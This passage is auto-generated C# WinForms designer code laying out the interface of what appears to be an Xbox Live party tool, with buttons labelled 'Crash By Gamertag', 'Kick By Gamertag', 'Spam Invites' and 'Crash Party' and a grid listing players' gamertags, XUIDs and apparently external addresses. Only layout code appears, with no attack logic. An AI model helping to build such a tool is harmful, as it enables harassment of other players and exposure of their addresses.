            this.SpamPartyInvx.Style = MetroFramework.MetroColorStyle.Teal;
            this.SpamPartyInvx.TabIndex = 55;
            this.SpamPartyInvx.Text = "Spam Invites";
            this.SpamPartyInvx.Theme = MetroFramework.MetroThemeStyle.Dark;
            this.SpamPartyInvx.UseStyleColors = true;
            this.SpamPartyInvx.UseVisualStyleBackColor = true;
            this.SpamPartyInvx.CheckedChanged += new System.EventHandler(this.SpamInboxChx_CheckedChanged);
            // 
            // InviteGamertagBtn
            // 
            this.InviteGamertagBtn.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(37)))), ((int)(((byte)(37)))), ((int)(((byte)(37)))));
            this.InviteGamertagBtn.Cursor = System.Windows.Forms.Cursors.Hand;
            this.InviteGamertagBtn.FlatAppearance.BorderColor = System.Drawing.Color.LightSeaGreen;
            this.InviteGamertagBtn.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
            this.InviteGamertagBtn.Font = new System.Drawing.Font("Segoe UI", 8.25F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.InviteGamertagBtn.ForeColor = System.Drawing.Color.LightSeaGreen;
            this.InviteGamertagBtn.Location = new System.Drawing.Point(801, 204);
            this.InviteGamertagBtn.Name = "InviteGamertagBtn";
            this.InviteGamertagBtn.Size = new System.Drawing.Size(137, 23);
            this.InviteGamertagBtn.TabIndex = 50;
            this.InviteGamertagBtn.Text = "Invite By Gamertag";
            this.InviteGamertagBtn.UseVisualStyleBackColor = false;
            this.InviteGamertagBtn.Click += new System.EventHandler(this.InviteGamertagBtn_Click);
            // 
            // SpoofTitleIDBtn
            // 
            this.SpoofTitleIDBtn.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(37)))), ((int)(((byte)(37)))), ((int)(((byte)(37)))));
            this.SpoofTitleIDBtn.Cursor = System.Windows.Forms.Cursors.Hand;
            this.SpoofTitleIDBtn.FlatAppearance.BorderColor = System.Drawing.Color.LightSeaGreen;
            this.SpoofTitleIDBtn.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
            this.SpoofTitleIDBtn.Font = new System.Drawing.Font("Segoe UI", 8.25F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.SpoofTitleIDBtn.ForeColor = System.Drawing.Color.LightSeaGreen;
            this.SpoofTitleIDBtn.Location = new System.Drawing.Point(801, 175);
            this.SpoofTitleIDBtn.Name = "SpoofTitleIDBtn";
            this.SpoofTitleIDBtn.Size = new System.Drawing.Size(137, 23);
            this.SpoofTitleIDBtn.TabIndex = 49;
            this.SpoofTitleIDBtn.Text = "Crash By Gamertag";
            this.SpoofTitleIDBtn.UseVisualStyleBackColor = false;
            this.SpoofTitleIDBtn.Click += new System.EventHandler(this.CrashByGT_Click);
            // 
            // PartyKickByGT
            // 
            this.PartyKickByGT.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(37)))), ((int)(((byte)(37)))), ((int)(((byte)(37)))));
            this.PartyKickByGT.Cursor = System.Windows.Forms.Cursors.Hand;
            this.PartyKickByGT.FlatAppearance.BorderColor = System.Drawing.Color.LightSeaGreen;
            this.PartyKickByGT.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
            this.PartyKickByGT.Font = new System.Drawing.Font("Segoe UI", 8.25F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.PartyKickByGT.ForeColor = System.Drawing.Color.LightSeaGreen;
            this.PartyKickByGT.Location = new System.Drawing.Point(801, 146);
            this.PartyKickByGT.Name = "PartyKickByGT";
            this.PartyKickByGT.Size = new System.Drawing.Size(137, 23);
            this.PartyKickByGT.TabIndex = 48;
            this.PartyKickByGT.Text = "Kick By Gamertag";
            this.PartyKickByGT.UseVisualStyleBackColor = false;
            this.PartyKickByGT.Click += new System.EventHandler(this.PartyKickByGT_Click);
            // 
            // PartyGTTxt
            // 
            this.PartyGTTxt.BackColor = System.Drawing.Color.Black;
            this.PartyGTTxt.CustomBackground = true;
            this.PartyGTTxt.CustomForeColor = true;
            this.PartyGTTxt.ForeColor = System.Drawing.Color.LightSeaGreen;
            this.PartyGTTxt.Location = new System.Drawing.Point(801, 88);
            this.PartyGTTxt.MaxLength = 15;
            this.PartyGTTxt.Name = "PartyGTTxt";
            this.PartyGTTxt.Size = new System.Drawing.Size(137, 23);
            this.PartyGTTxt.Style = MetroFramework.MetroColorStyle.Black;
            this.PartyGTTxt.TabIndex = 47;
            this.PartyGTTxt.TextAlign = System.Windows.Forms.HorizontalAlignment.Center;
            this.PartyGTTxt.Theme = MetroFramework.MetroThemeStyle.Dark;
            this.PartyGTTxt.UseStyleColors = true;
            this.PartyGTTxt.Click += new System.EventHandler(this.PartyGTTxt_Enter);
            this.PartyGTTxt.Enter += new System.EventHandler(this.PartyGTTxt_Enter);
            this.PartyGTTxt.Leave += new System.EventHandler(this.PartyGTTxt_Leave);
            // 
            // GrabPartyByGT
            // 
            this.GrabPartyByGT.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(37)))), ((int)(((byte)(37)))), ((int)(((byte)(37)))));
            this.GrabPartyByGT.Cursor = System.Windows.Forms.Cursors.Hand;
            this.GrabPartyByGT.FlatAppearance.BorderColor = System.Drawing.Color.LightSeaGreen;
            this.GrabPartyByGT.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
            this.GrabPartyByGT.Font = new System.Drawing.Font("Segoe UI", 8.25F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.GrabPartyByGT.ForeColor = System.Drawing.Color.LightSeaGreen;
            this.GrabPartyByGT.Location = new System.Drawing.Point(801, 117);
            this.GrabPartyByGT.Name = "GrabPartyByGT";
            this.GrabPartyByGT.Size = new System.Drawing.Size(137, 23);
            this.GrabPartyByGT.TabIndex = 46;
            this.GrabPartyByGT.Text = "Grab By Gamertag";
            this.GrabPartyByGT.UseVisualStyleBackColor = false;
            this.GrabPartyByGT.Click += new System.EventHandler(this.GrabPartyByGT_Click);
            // 
            // metroPanel18
            // 
            this.metroPanel18.BackColor = System.Drawing.Color.LightSeaGreen;
            this.metroPanel18.CustomBackground = true;
            this.metroPanel18.HorizontalScrollbarBarColor = true;
            this.metroPanel18.HorizontalScrollbarHighlightOnWheel = false;
            this.metroPanel18.HorizontalScrollbarSize = 10;
            this.metroPanel18.Location = new System.Drawing.Point(203, 257);
            this.metroPanel18.Name = "metroPanel18";
            this.metroPanel18.Size = new System.Drawing.Size(567, 2);
            this.metroPanel18.Style = MetroFramework.MetroColorStyle.Teal;
            this.metroPanel18.TabIndex = 45;
            this.metroPanel18.Theme = MetroFramework.MetroThemeStyle.Dark;
            this.metroPanel18.VerticalScrollbarBarColor = true;
            this.metroPanel18.VerticalScrollbarHighlightOnWheel = false;
            this.metroPanel18.VerticalScrollbarSize = 10;
            // 
            // metroPanel17
            // 
            this.metroPanel17.BackColor = System.Drawing.Color.LightSeaGreen;
            this.metroPanel17.CustomBackground = true;
            this.metroPanel17.HorizontalScrollbarBarColor = true;
            this.metroPanel17.HorizontalScrollbarHighlightOnWheel = false;
            this.metroPanel17.HorizontalScrollbarSize = 10;
            this.metroPanel17.Location = new System.Drawing.Point(203, 237);
            this.metroPanel17.Name = "metroPanel17";
            this.metroPanel17.Size = new System.Drawing.Size(567, 2);
            this.metroPanel17.Style = MetroFramework.MetroColorStyle.Teal;
            this.metroPanel17.TabIndex = 44;
            this.metroPanel17.Theme = MetroFramework.MetroThemeStyle.Dark;
            this.metroPanel17.VerticalScrollbarBarColor = true;
            this.metroPanel17.VerticalScrollbarHighlightOnWheel = false;
            this.metroPanel17.VerticalScrollbarSize = 10;
            // 
            // metroPanel16
            // 
            this.metroPanel16.BackColor = System.Drawing.Color.LightSeaGreen;
            this.metroPanel16.CustomBackground = true;
            this.metroPanel16.HorizontalScrollbarBarColor = true;
            this.metroPanel16.HorizontalScrollbarHighlightOnWheel = false;
            this.metroPanel16.HorizontalScrollbarSize = 10;
            this.metroPanel16.Location = new System.Drawing.Point(203, 216);
            this.metroPanel16.Name = "metroPanel16";
            this.metroPanel16.Size = new System.Drawing.Size(567, 2);
            this.metroPanel16.Style = MetroFramework.MetroColorStyle.Teal;
            this.metroPanel16.TabIndex = 43;
            this.metroPanel16.Theme = MetroFramework.MetroThemeStyle.Dark;
            this.metroPanel16.VerticalScrollbarBarColor = true;
            this.metroPanel16.VerticalScrollbarHighlightOnWheel = false;
            this.metroPanel16.VerticalScrollbarSize = 10;
            // 
            // metroPanel15
            // 
            this.metroPanel15.BackColor = System.Drawing.Color.LightSeaGreen;
            this.metroPanel15.CustomBackground = true;
            this.metroPanel15.HorizontalScrollbarBarColor = true;
            this.metroPanel15.HorizontalScrollbarHighlightOnWheel = false;
            this.metroPanel15.HorizontalScrollbarSize = 10;
            this.metroPanel15.Location = new System.Drawing.Point(203, 195);
            this.metroPanel15.Name = "metroPanel15";
            this.metroPanel15.Size = new System.Drawing.Size(567, 2);
            this.metroPanel15.Style = MetroFramework.MetroColorStyle.Teal;
            this.metroPanel15.TabIndex = 42;
            this.metroPanel15.Theme = MetroFramework.MetroThemeStyle.Dark;
            this.metroPanel15.VerticalScrollbarBarColor = true;
            this.metroPanel15.VerticalScrollbarHighlightOnWheel = false;
            this.metroPanel15.VerticalScrollbarSize = 10;
            // 
            // metroPanel14
            // 
            this.metroPanel14.BackColor = System.Drawing.Color.LightSeaGreen;
            this.metroPanel14.CustomBackground = true;
            this.metroPanel14.HorizontalScrollbarBarColor = true;
            this.metroPanel14.HorizontalScrollbarHighlightOnWheel = false;
            this.metroPanel14.HorizontalScrollbarSize = 10;
            this.metroPanel14.Location = new System.Drawing.Point(203, 175);
            this.metroPanel14.Name = "metroPanel14";
            this.metroPanel14.Size = new System.Drawing.Size(567, 2);
            this.metroPanel14.Style = MetroFramework.MetroColorStyle.Teal;
            this.metroPanel14.TabIndex = 41;
            this.metroPanel14.Theme = MetroFramework.MetroThemeStyle.Dark;
            this.metroPanel14.VerticalScrollbarBarColor = true;
            this.metroPanel14.VerticalScrollbarHighlightOnWheel = false;
            this.metroPanel14.VerticalScrollbarSize = 10;
            // 
            // metroPanel13
            // 
            this.metroPanel13.BackColor = System.Drawing.Color.LightSeaGreen;
            this.metroPanel13.CustomBackground = true;
            this.metroPanel13.HorizontalScrollbarBarColor = true;
            this.metroPanel13.HorizontalScrollbarHighlightOnWheel = false;
            this.metroPanel13.HorizontalScrollbarSize = 10;
            this.metroPanel13.Location = new System.Drawing.Point(203, 155);
            this.metroPanel13.Name = "metroPanel13";
            this.metroPanel13.Size = new System.Drawing.Size(567, 2);
            this.metroPanel13.Style = MetroFramework.MetroColorStyle.Teal;
            this.metroPanel13.TabIndex = 40;
            this.metroPanel13.Theme = MetroFramework.MetroThemeStyle.Dark;
            this.metroPanel13.VerticalScrollbarBarColor = true;
            this.metroPanel13.VerticalScrollbarHighlightOnWheel = false;
            this.metroPanel13.VerticalScrollbarSize = 10;
            // 
            // metroPanel12
            // 
            this.metroPanel12.BackColor = System.Drawing.Color.LightSeaGreen;
            this.metroPanel12.CustomBackground = true;
            this.metroPanel12.HorizontalScrollbarBarColor = true;
            this.metroPanel12.HorizontalScrollbarHighlightOnWheel = false;
            this.metroPanel12.HorizontalScrollbarSize = 10;
            this.metroPanel12.Location = new System.Drawing.Point(203, 134);
            this.metroPanel12.Name = "metroPanel12";
            this.metroPanel12.Size = new System.Drawing.Size(567, 2);
            this.metroPanel12.Style = MetroFramework.MetroColorStyle.Teal;
            this.metroPanel12.TabIndex = 39;
            this.metroPanel12.Theme = MetroFramework.MetroThemeStyle.Dark;
            this.metroPanel12.VerticalScrollbarBarColor = true;
            this.metroPanel12.VerticalScrollbarHighlightOnWheel = false;
            this.metroPanel12.VerticalScrollbarSize = 10;
            // 
            // metroPanel11
            // 
            this.metroPanel11.BackColor = System.Drawing.Color.LightSeaGreen;
            this.metroPanel11.CustomBackground = true;
            this.metroPanel11.HorizontalScrollbarBarColor = true;
            this.metroPanel11.HorizontalScrollbarHighlightOnWheel = false;
            this.metroPanel11.HorizontalScrollbarSize = 10;
            this.metroPanel11.Location = new System.Drawing.Point(203, 113);
            this.metroPanel11.Name = "metroPanel11";
            this.metroPanel11.Size = new System.Drawing.Size(567, 2);
            this.metroPanel11.Style = MetroFramework.MetroColorStyle.Teal;
            this.metroPanel11.TabIndex = 38;
            this.metroPanel11.Theme = MetroFramework.MetroThemeStyle.Dark;
            this.metroPanel11.VerticalScrollbarBarColor = true;
            this.metroPanel11.VerticalScrollbarHighlightOnWheel = false;
            this.metroPanel11.VerticalScrollbarSize = 10;
            // 
            // metroPanel10
            // 
            this.metroPanel10.BackColor = System.Drawing.Color.LightSeaGreen;
            this.metroPanel10.CustomBackground = true;
            this.metroPanel10.HorizontalScrollbarBarColor = true;
            this.metroPanel10.HorizontalScrollbarHighlightOnWheel = false;
            this.metroPanel10.HorizontalScrollbarSize = 10;
            this.metroPanel10.Location = new System.Drawing.Point(203, 92);
            this.metroPanel10.Name = "metroPanel10";
            this.metroPanel10.Size = new System.Drawing.Size(567, 2);
            this.metroPanel10.Style = MetroFramework.MetroColorStyle.Teal;
            this.metroPanel10.TabIndex = 37;
            this.metroPanel10.Theme = MetroFramework.MetroThemeStyle.Dark;
            this.metroPanel10.VerticalScrollbarBarColor = true;
            this.metroPanel10.VerticalScrollbarHighlightOnWheel = false;
            this.metroPanel10.VerticalScrollbarSize = 10;
            // 
            // metroPanel9
            // 
            this.metroPanel9.BackColor = System.Drawing.Color.LightSeaGreen;
            this.metroPanel9.CustomBackground = true;
            this.metroPanel9.HorizontalScrollbarBarColor = true;
            this.metroPanel9.HorizontalScrollbarHighlightOnWheel = false;
            this.metroPanel9.HorizontalScrollbarSize = 10;
            this.metroPanel9.Location = new System.Drawing.Point(203, 71);
            this.metroPanel9.Name = "metroPanel9";
            this.metroPanel9.Size = new System.Drawing.Size(567, 2);
            this.metroPanel9.Style = MetroFramework.MetroColorStyle.Teal;
            this.metroPanel9.TabIndex = 36;
            this.metroPanel9.Theme = MetroFramework.MetroThemeStyle.Dark;
            this.metroPanel9.VerticalScrollbarBarColor = true;
            this.metroPanel9.VerticalScrollbarHighlightOnWheel = false;
            this.metroPanel9.VerticalScrollbarSize = 10;
            // 
            // metroPanel8
            // 
            this.metroPanel8.BackColor = System.Drawing.Color.LightSeaGreen;
            this.metroPanel8.CustomBackground = true;
            this.metroPanel8.HorizontalScrollbarBarColor = true;
            this.metroPanel8.HorizontalScrollbarHighlightOnWheel = false;
            this.metroPanel8.HorizontalScrollbarSize = 10;
            this.metroPanel8.Location = new System.Drawing.Point(203, 50);
            this.metroPanel8.Name = "metroPanel8";
            this.metroPanel8.Size = new System.Drawing.Size(567, 2);
            this.metroPanel8.Style = MetroFramework.MetroColorStyle.Teal;
            this.metroPanel8.TabIndex = 35;
            this.metroPanel8.Theme = MetroFramework.MetroThemeStyle.Dark;
            this.metroPanel8.VerticalScrollbarBarColor = true;
            this.metroPanel8.VerticalScrollbarHighlightOnWheel = false;
            this.metroPanel8.VerticalScrollbarSize = 10;
            // 
            // metroPanel7
            // 
            this.metroPanel7.BackColor = System.Drawing.Color.LightSeaGreen;
            this.metroPanel7.CustomBackground = true;
            this.metroPanel7.HorizontalScrollbarBarColor = true;
            this.metroPanel7.HorizontalScrollbarHighlightOnWheel = false;
            this.metroPanel7.HorizontalScrollbarSize = 10;
            this.metroPanel7.Location = new System.Drawing.Point(203, 30);
            this.metroPanel7.Name = "metroPanel7";
            this.metroPanel7.Size = new System.Drawing.Size(567, 1);
            this.metroPanel7.Style = MetroFramework.MetroColorStyle.Teal;
            this.metroPanel7.TabIndex = 34;
            this.metroPanel7.Theme = MetroFramework.MetroThemeStyle.Dark;
            this.metroPanel7.VerticalScrollbarBarColor = true;
            this.metroPanel7.VerticalScrollbarHighlightOnWheel = false;
            this.metroPanel7.VerticalScrollbarSize = 10;
            // 
            // metroPanel6
            // 
            this.metroPanel6.BackColor = System.Drawing.Color.LightSeaGreen;
            this.metroPanel6.CustomBackground = true;
            this.metroPanel6.HorizontalScrollbarBarColor = true;
            this.metroPanel6.HorizontalScrollbarHighlightOnWheel = false;
            this.metroPanel6.HorizontalScrollbarSize = 10;
            this.metroPanel6.Location = new System.Drawing.Point(203, 276);
            this.metroPanel6.Name = "metroPanel6";
            this.metroPanel6.Size = new System.Drawing.Size(567, 2);
            this.metroPanel6.Style = MetroFramework.MetroColorStyle.Teal;
            this.metroPanel6.TabIndex = 33;
            this.metroPanel6.Theme = MetroFramework.MetroThemeStyle.Dark;
            this.metroPanel6.VerticalScrollbarBarColor = true;
            this.metroPanel6.VerticalScrollbarHighlightOnWheel = false;
            this.metroPanel6.VerticalScrollbarSize = 10;
            // 
            // metroPanel5
            // 
            this.metroPanel5.BackColor = System.Drawing.Color.LightSeaGreen;
            this.metroPanel5.CustomBackground = true;
            this.metroPanel5.HorizontalScrollbarBarColor = true;
            this.metroPanel5.HorizontalScrollbarHighlightOnWheel = false;
            this.metroPanel5.HorizontalScrollbarSize = 10;
            this.metroPanel5.Location = new System.Drawing.Point(584, 14);
            this.metroPanel5.Name = "metroPanel5";
            this.metroPanel5.Size = new System.Drawing.Size(2, 262);
            this.metroPanel5.Style = MetroFramework.MetroColorStyle.Teal;
            this.metroPanel5.TabIndex = 32;
            this.metroPanel5.Theme = MetroFramework.MetroThemeStyle.Dark;
            this.metroPanel5.VerticalScrollbarBarColor = true;
            this.metroPanel5.VerticalScrollbarHighlightOnWheel = false;
            this.metroPanel5.VerticalScrollbarSize = 10;
            // 
            // metroPanel4
            // 
            this.metroPanel4.BackColor = System.Drawing.Color.LightSeaGreen;
            this.metroPanel4.CustomBackground = true;
            this.metroPanel4.HorizontalScrollbarBarColor = true;
            this.metroPanel4.HorizontalScrollbarHighlightOnWheel = false;
            this.metroPanel4.HorizontalScrollbarSize = 10;
            this.metroPanel4.Location = new System.Drawing.Point(519, 14);
            this.metroPanel4.Name = "metroPanel4";
            this.metroPanel4.Size = new System.Drawing.Size(2, 262);
            this.metroPanel4.Style = MetroFramework.MetroColorStyle.Teal;
            this.metroPanel4.TabIndex = 31;
            this.metroPanel4.Theme = MetroFramework.MetroThemeStyle.Dark;
            this.metroPanel4.VerticalScrollbarBarColor = true;
            this.metroPanel4.VerticalScrollbarHighlightOnWheel = false;
            this.metroPanel4.VerticalScrollbarSize = 10;
            // 
            // metroPanel3
            // 
            this.metroPanel3.BackColor = System.Drawing.Color.LightSeaGreen;
            this.metroPanel3.CustomBackground = true;
            this.metroPanel3.HorizontalScrollbarBarColor = true;
            this.metroPanel3.HorizontalScrollbarHighlightOnWheel = false;
            this.metroPanel3.HorizontalScrollbarSize = 10;
            this.metroPanel3.Location = new System.Drawing.Point(360, 14);
            this.metroPanel3.Name = "metroPanel3";
            this.metroPanel3.Size = new System.Drawing.Size(2, 262);
            this.metroPanel3.Style = MetroFramework.MetroColorStyle.Teal;
            this.metroPanel3.TabIndex = 30;
            this.metroPanel3.Theme = MetroFramework.MetroThemeStyle.Dark;
            this.metroPanel3.VerticalScrollbarBarColor = true;
            this.metroPanel3.VerticalScrollbarHighlightOnWheel = false;
            this.metroPanel3.VerticalScrollbarSize = 10;
            // 
            // metroPanel2
            // 
            this.metroPanel2.BackColor = System.Drawing.Color.LightSeaGreen;
            this.metroPanel2.CustomBackground = true;
            this.metroPanel2.HorizontalScrollbarBarColor = true;
            this.metroPanel2.HorizontalScrollbarHighlightOnWheel = false;
            this.metroPanel2.HorizontalScrollbarSize = 10;
            this.metroPanel2.Location = new System.Drawing.Point(768, 13);
            this.metroPanel2.Name = "metroPanel2";
            this.metroPanel2.Size = new System.Drawing.Size(2, 263);
            this.metroPanel2.Style = MetroFramework.MetroColorStyle.Teal;
            this.metroPanel2.TabIndex = 29;
            this.metroPanel2.Theme = MetroFramework.MetroThemeStyle.Dark;
            this.metroPanel2.VerticalScrollbarBarColor = true;
            this.metroPanel2.VerticalScrollbarHighlightOnWheel = false;
            this.metroPanel2.VerticalScrollbarSize = 10;
            // 
            // metroPanel1
            // 
            this.metroPanel1.BackColor = System.Drawing.Color.LightSeaGreen;
            this.metroPanel1.CustomBackground = true;
            this.metroPanel1.HorizontalScrollbarBarColor = true;
            this.metroPanel1.HorizontalScrollbarHighlightOnWheel = false;
            this.metroPanel1.HorizontalScrollbarSize = 10;
            this.metroPanel1.Location = new System.Drawing.Point(203, 13);
            this.metroPanel1.Name = "metroPanel1";
            this.metroPanel1.Size = new System.Drawing.Size(2, 263);
            this.metroPanel1.Style = MetroFramework.MetroColorStyle.Teal;
            this.metroPanel1.TabIndex = 28;
            this.metroPanel1.Theme = MetroFramework.MetroThemeStyle.Dark;
            this.metroPanel1.VerticalScrollbarBarColor = true;
            this.metroPanel1.VerticalScrollbarHighlightOnWheel = false;
            this.metroPanel1.VerticalScrollbarSize = 10;
            // 
            // button22
            // 
            this.button22.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(37)))), ((int)(((byte)(37)))), ((int)(((byte)(37)))));
            this.button22.Cursor = System.Windows.Forms.Cursors.Hand;
            this.button22.FlatAppearance.BorderColor = System.Drawing.Color.LightSeaGreen;
            this.button22.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
            this.button22.Font = new System.Drawing.Font("Segoe UI", 8.25F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.button22.ForeColor = System.Drawing.Color.LightSeaGreen;
            this.button22.Location = new System.Drawing.Point(382, 301);
            this.button22.Name = "button22";
            this.button22.Size = new System.Drawing.Size(104, 32);
            this.button22.TabIndex = 25;
            this.button22.Text = "Open Party";
            this.button22.UseVisualStyleBackColor = false;
            this.button22.Click += new System.EventHandler(this.button22_Click);
            // 
            // button13
            // 
            this.button13.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(37)))), ((int)(((byte)(37)))), ((int)(((byte)(37)))));
            this.button13.Cursor = System.Windows.Forms.Cursors.Hand;
            this.button13.FlatAppearance.BorderColor = System.Drawing.Color.LightSeaGreen;
            this.button13.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
            this.button13.Font = new System.Drawing.Font("Segoe UI", 8.25F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.button13.ForeColor = System.Drawing.Color.LightSeaGreen;
            this.button13.Location = new System.Drawing.Point(712, 301);
            this.button13.Name = "button13";
            this.button13.Size = new System.Drawing.Size(104, 32);
            this.button13.TabIndex = 24;
            this.button13.Text = "Crash Party";
            this.button13.UseVisualStyleBackColor = false;
            this.button13.Click += new System.EventHandler(this.button13_Click);
            // 
            // button12
            // 
            this.button12.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(37)))), ((int)(((byte)(37)))), ((int)(((byte)(37)))));
            this.button12.Cursor = System.Windows.Forms.Cursors.Hand;
            this.button12.FlatAppearance.BorderColor = System.Drawing.Color.LightSeaGreen;
            this.button12.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
            this.button12.Font = new System.Drawing.Font("Segoe UI", 8.25F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.button12.ForeColor = System.Drawing.Color.LightSeaGreen;
            this.button12.Location = new System.Drawing.Point(602, 301);
            this.button12.Name = "button12";
            this.button12.Size = new System.Drawing.Size(104, 32);
            this.button12.TabIndex = 23;
            this.button12.Text = "Close Party";
            this.button12.UseVisualStyleBackColor = false;
            this.button12.Click += new System.EventHandler(this.button12_Click);
            // 
            // button11
            // 
            this.button11.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(37)))), ((int)(((byte)(37)))), ((int)(((byte)(37)))));
            this.button11.Cursor = System.Windows.Forms.Cursors.Hand;
            this.button11.FlatAppearance.BorderColor = System.Drawing.Color.LightSeaGreen;
            this.button11.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
            this.button11.Font = new System.Drawing.Font("Segoe UI", 8.25F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.button11.ForeColor = System.Drawing.Color.LightSeaGreen;
            this.button11.Location = new System.Drawing.Point(492, 301);
            this.button11.Name = "button11";
            this.button11.Size = new System.Drawing.Size(104, 32);
            this.button11.TabIndex = 22;
            this.button11.Text = "Lock Party";
            this.button11.UseVisualStyleBackColor = false;
            this.button11.Click += new System.EventHandler(this.button11_Click);
            // 
            // DataClients
            // 
            this.DataClients.AllowUserToAddRows = false;
            dataGridViewCellStyle5.Font = new System.Drawing.Font("Segoe UI", 9F);
            this.DataClients.AlternatingRowsDefaultCellStyle = dataGridViewCellStyle5;
            this.DataClients.AutoSizeRowsMode = System.Windows.Forms.DataGridViewAutoSizeRowsMode.AllCells;
            this.DataClients.BackgroundColor = System.Drawing.Color.FromArgb(((int)(((byte)(17)))), ((int)(((byte)(17)))), ((int)(((byte)(17)))));
            this.DataClients.CellBorderStyle = System.Windows.Forms.DataGridViewCellBorderStyle.Sunken;
            this.DataClients.ColumnHeadersBorderStyle = System.Windows.Forms.DataGridViewHeaderBorderStyle.Single;
            dataGridViewCellStyle6.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleCenter;
            dataGridViewCellStyle6.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(17)))), ((int)(((byte)(17)))), ((int)(((byte)(17)))));
            dataGridViewCellStyle6.Font = new System.Drawing.Font("Microsoft Sans Serif", 8.25F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            dataGridViewCellStyle6.ForeColor = System.Drawing.Color.LightSeaGreen;
            dataGridViewCellStyle6.SelectionBackColor = System.Drawing.Color.FromArgb(((int)(((byte)(17)))), ((int)(((byte)(17)))), ((int)(((byte)(17)))));
            dataGridViewCellStyle6.SelectionForeColor = System.Drawing.Color.LightSeaGreen;
            dataGridViewCellStyle6.WrapMode = System.Windows.Forms.DataGridViewTriState.True;
            this.DataClients.ColumnHeadersDefaultCellStyle = dataGridViewCellStyle6;
            this.DataClients.ColumnHeadersHeightSizeMode = System.Windows.Forms.DataGridViewColumnHeadersHeightSizeMode.AutoSize;
            this.DataClients.Columns.AddRange(new System.Windows.Forms.DataGridViewColumn[] {
            this.Gamertag,
            this.External,
            this.NADE,
            this.jointime,
            this.xuids});
            this.DataClients.ContextMenuStrip = this.contextMenuStrip2;
            dataGridViewCellStyle7.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleLeft;
            dataGridViewCellStyle7.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(17)))), ((int)(((byte)(17)))), ((int)(((byte)(17)))));
            dataGridViewCellStyle7.Font = new System.Drawing.Font("Microsoft Sans Serif", 8.25F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            dataGridViewCellStyle7.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(0)))), ((int)(((byte)(0)))), ((int)(((byte)(0)))));
            dataGridViewCellStyle7.SelectionBackColor = System.Drawing.Color.FromArgb(((int)(((byte)(17)))), ((int)(((byte)(17)))), ((int)(((byte)(17)))));
            dataGridViewCellStyle7.SelectionForeColor = System.Drawing.Color.LightSeaGreen;
            dataGridViewCellStyle7.WrapMode = System.Windows.Forms.DataGridViewTriState.False;
            this.DataClients.DefaultCellStyle = dataGridViewCellStyle7;
            this.DataClients.EditMode = System.Windows.Forms.DataGridViewEditMode.EditProgrammatically;
            this.DataClients.EnableHeadersVisualStyles = false;
            this.DataClients.GridColor = System.Drawing.Color.LightSeaGreen;
            this.DataClients.Location = new System.Drawing.Point(203, 13);
            this.DataClients.MultiSelect = false;
            this.DataClients.Name = "DataClients";
            this.DataClients.ReadOnly = true;
            this.DataClients.RowHeadersBorderStyle = System.Windows.Forms.DataGridViewHeaderBorderStyle.None;
            dataGridViewCellStyle8.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleLeft;
            dataGridViewCellStyle8.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(17)))), ((int)(((byte)(17)))), ((int)(((byte)(17)))));
            dataGridViewCellStyle8.Font = new System.Drawing.Font("Microsoft Sans Serif", 8.25F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            dataGridViewCellStyle8.ForeColor = System.Drawing.Color.LightSeaGreen;
            dataGridViewCellStyle8.SelectionBackColor = System.Drawing.Color.FromArgb(((int)(((byte)(17)))), ((int)(((byte)(17)))), ((int)(((byte)(17)))));
            dataGridViewCellStyle8.SelectionForeColor = System.Drawing.Color.LightSeaGreen;
            dataGridViewCellStyle8.WrapMode = System.Windows.Forms.DataGridViewTriState.True;
            this.DataClients.RowHeadersDefaultCellStyle = dataGridViewCellStyle8;
            this.DataClients.RowHeadersVisible = false;
            dataGridViewCellStyle9.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(17)))), ((int)(((byte)(17)))), ((int)(((byte)(17)))));
            dataGridViewCellStyle9.Font = new System.Drawing.Font("Segoe UI", 9F);
            dataGridViewCellStyle9.ForeColor = System.Drawing.Color.LightSeaGreen;
            dataGridViewCellStyle9.SelectionBackColor = System.Drawing.Color.FromArgb(((int)(((byte)(17)))), ((int)(((byte)(17)))), ((int)(((byte)(17)))));
            dataGridViewCellStyle9.SelectionForeColor = System.Drawing.Color.LightSeaGreen;
            this.DataClients.RowsDefaultCellStyle = dataGridViewCellStyle9;
            this.DataClients.RowTemplate.DefaultCellStyle.Font = new System.Drawing.Font("Segoe UI", 9F);
            this.DataClients.ScrollBars = System.Windows.Forms.ScrollBars.Vertical;
            this.DataClients.SelectionMode = System.Windows.Forms.DataGridViewSelectionMode.FullRowSelect;
